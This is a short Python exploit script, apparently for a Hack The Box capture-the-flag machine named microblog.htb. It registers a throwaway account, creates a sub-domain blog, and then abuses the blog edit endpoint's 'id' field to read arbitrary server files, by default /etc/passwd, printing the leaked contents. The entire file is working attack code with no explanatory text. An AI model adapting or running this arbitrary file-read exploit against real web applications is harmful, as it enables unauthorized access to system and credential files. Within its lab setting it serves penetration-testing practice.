import requests
import string
import secrets
import sys
import re

if len(sys.argv) != 2:
    filename = "/etc/passwd"
else :
    filename = sys.argv[1]

username = ''.join(secrets.choice(string.ascii_lowercase) for i in range(10))

session = requests.Session()
session.proxies.update({'http':'http://127.0.0.1:8080'})

# Register Account
body = {"first-name": "first","last-name": "last","username":username ,"password": "Password"}
session.post('http://app.microblog.htb/register/index.php',data=body)

# Create Sub-domain
body = {"new-blog-name" : username}
session.post('http://app.microblog.htb/dashboard/index.php',data=body)

# Leak the file 
body = {"id" : filename, "txt" : "Doesnt't Matter"}
r =session.post('http://app.microblog.htb/edit/index.php',data=body, headers={"Host":f"{username}.microblog.htb"}, allow_redirects=False)
pattern = r'blog-indiv-content\\">(.*)<\\/div>'
match = re.search(pattern, r.content.decode())
data = match.group(1)

#decoded_data = bytes(data, "utf-8").decode("unicode_escape").replace("\\/", "/")
#print(decoded_data)

print(data.replace("\\n", "\n").replace("\\t", "\t").replace("\\/", "/"))


